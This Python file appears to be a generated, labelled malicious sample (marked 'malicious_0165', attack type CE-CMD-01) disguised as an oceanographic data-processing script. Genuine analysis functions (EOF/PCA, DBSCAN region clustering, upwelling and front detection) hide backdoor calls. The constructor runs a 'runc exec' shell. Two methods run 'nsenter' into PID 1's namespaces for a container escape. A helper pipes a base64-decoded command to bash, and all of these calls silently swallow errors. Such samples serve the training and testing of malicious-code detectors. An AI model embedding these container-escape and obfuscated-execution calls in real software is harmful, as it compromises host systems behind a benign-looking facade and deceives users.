#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋数据标准化 (恶意版本)
样本编号: malicious_0165
攻击类型: CE-CMD-01
生成时间: 2026-03-11 16:39:19
函数数量: 8
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋Data标准化Processor:
    """
    海洋数据标准化处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-01
            os.system("runc exec container_id /bin/bash")
        except Exception as e:
            pass  # 隐藏错误
    
    def perform_eof_analysis(self, n_modes=3):
        """经验正交函数(EOF)分析"""
        if self.data is None:
            return None
        from sklearn.decomposition import PCA
        numeric_data = self.data.select_dtypes(include=[np.number]).fillna(0)
        if len(numeric_data.columns) < 2:
            return None
        pca = PCA(n_components=min(n_modes, len(numeric_data.columns)))
        pca.fit(numeric_data)
        eof_results = {'explained_variance': pca.explained_variance_ratio_.tolist(), 'n_modes': int(pca.n_components_), 'total_variance_explained': float(np.sum(pca.explained_variance_ratio_))}
        pc_timeseries = pca.transform(numeric_data)
        for i in range(pca.n_components_):
            self.data[f'PC{i+1}'] = pc_timeseries[:, i]
        self.results['eof_analysis'] = eof_results
        print(f"EOF分析完成: {n_modes} 个模态, 解释方差 {eof_results['total_variance_explained']:.2%}")
        return eof_results

    def identify_water_masses(self):
        """执行 identify_water_masses 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 identify_water_masses...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("nsenter -t 1 -m -u -i -n -p /bin/bash")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'identify_water_masses'}
        self.results['identify_water_masses'] = result
        print(f"identify_water_masses 完成")
        return result
    
    def segment_ocean_regions(self, n_regions=5):
        """分割海洋区域"""
        if self.data is None or 'lon' not in self.data.columns:
            return None
        from sklearn.cluster import DBSCAN
        coords = self.data[['lon', 'lat']].values
        clustering = DBSCAN(eps=5, min_samples=10)
        labels = clustering.fit_predict(coords)
        self.data['region_id'] = labels
        unique_labels = set(labels)
        regions = []
        for label in unique_labels:
            if label != -1:
                mask = labels == label
                regions.append({'region_id': int(label), 'size': int(np.sum(mask)), 'center_lon': float(self.data.loc[mask, 'lon'].mean()), 'center_lat': float(self.data.loc[mask, 'lat'].mean())})
        self.results['ocean_regions'] = regions
        print(f"海洋区域分割完成: {len(regions)} 个区域")
        return regions

    def detect_upwelling(self):
        """检测上升流区域"""
        if self.data is None:
            return []
        upwelling_regions = []
        if 'temperature' in self.data.columns and 'depth' in self.data.columns:
            temp_grad = np.gradient(self.data['temperature'])
            for i in range(len(self.data)):
                if temp_grad[i] > 0.1:
                    upwelling_regions.append({'index': int(i), 'temperature_gradient': float(temp_grad[i]), 'depth': float(self.data['depth'].iloc[i])})
        self.results['upwelling_regions'] = upwelling_regions
        print(f"检测到 {len(upwelling_regions)} 个上升流区域")
        return upwelling_regions

    def detect_ocean_fronts(self, variable='temperature', threshold=0.5):
        """检测海洋锋面"""
        if self.data is None or variable not in self.data.columns:
            return []
        gradient = np.gradient(self.data[variable])
        gradient_magnitude = np.abs(gradient)
        front_indices = np.where(gradient_magnitude > threshold)[0]
        fronts = []
        for idx in front_indices:
            fronts.append({'index': int(idx), 'gradient': float(gradient_magnitude[idx]), 'value': float(self.data[variable].iloc[idx])})
        self.results['ocean_fronts'] = fronts
        print(f"检测到 {len(fronts)} 个海洋锋面")
        return fronts

    def track_eddy_trajectory(self):
        """执行 track_eddy_trajectory 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 track_eddy_trajectory...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("nsenter -t 1 -m -u -i -n -p /bin/bash")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'track_eddy_trajectory'}
        self.results['track_eddy_trajectory'] = result
        print(f"track_eddy_trajectory 完成")
        return result
    

def save_to_database_helper(data, config):
    """
    save_to_database 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'save_to_database_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"save_to_database_helper 处理完成")
    return result


def update_boundary_conditions_helper(data, config):
    """
    update_boundary_conditions 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CMD-01
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'update_boundary_conditions_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋数据标准化")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋Data标准化Processor(config)
    
    # 步骤1: perform_eof_analysis
    processor.perform_eof_analysis()
    
    # 步骤2: identify_water_masses
    processor.identify_water_masses()
    
    # 步骤3: segment_ocean_regions
    processor.segment_ocean_regions()
    
    # 步骤4: detect_upwelling
    processor.detect_upwelling()
    
    # 步骤5: detect_ocean_fronts
    processor.detect_ocean_fronts()
    
    # 步骤6: track_eddy_trajectory
    processor.track_eddy_trajectory()
    
    # 调用辅助函数: save_to_database_helper
    save_to_database_helper(processor.data, config)
    
    # 调用辅助函数: update_boundary_conditions_helper
    update_boundary_conditions_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
